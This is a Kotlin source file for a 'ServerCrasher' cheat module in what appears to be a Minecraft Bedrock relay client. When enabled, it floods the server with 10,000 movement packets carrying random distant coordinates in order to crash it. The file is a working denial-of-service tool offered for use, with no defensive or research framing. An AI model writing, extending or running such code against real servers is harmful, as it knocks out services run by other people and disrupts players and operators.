package dev.sora.relay.cheat.module.impl.misc

import com.nukkitx.math.vector.Vector3f
import com.nukkitx.protocol.bedrock.data.Ability
import com.nukkitx.protocol.bedrock.data.PlayerAuthInputData
import com.nukkitx.protocol.bedrock.packet.AnimatePacket
import com.nukkitx.protocol.bedrock.packet.MovePlayerPacket
import com.nukkitx.protocol.bedrock.packet.PlayerAuthInputPacket
import com.nukkitx.protocol.bedrock.packet.RequestAbilityPacket
import dev.sora.relay.cheat.module.CheatModule
import dev.sora.relay.cheat.value.ListValue
import dev.sora.relay.game.event.EventPacketOutbound
import dev.sora.relay.game.event.Listen
import dev.sora.relay.game.utils.movement.MovementUtils
import dev.sora.relay.utils.RandomUtils

class ModuleServerCrasher : CheatModule("ServerCrasher","一键崩服") {
    private val modeValue = ListValue("Mode", arrayOf("Mode1", "Mode2"), "Mode1")
    override fun onEnable() {
        super.onEnable()
        when {
            modeValue.get() == "Mode1" -> {
                val netSession = session.netSession
                val packet = MovePlayerPacket().apply {
                    runtimeEntityId = mc.thePlayer.entityId
                    position = Vector3f.from(RandomUtils.nextDouble(0.0,65535.0),mc.thePlayer.posY,RandomUtils.nextDouble(0.0,65535.0))
                    rotation = mc.thePlayer.vec3Rotation
                    mode = MovePlayerPacket.Mode.NORMAL
                    isOnGround = false
                    ridingRuntimeEntityId = 0
                    entityType = 0
                    tick = mc.thePlayer.tickExists
                }
                repeat(10000) {
                    netSession.outboundPacket(packet)
                }
            }
        }
        state=false
    }
}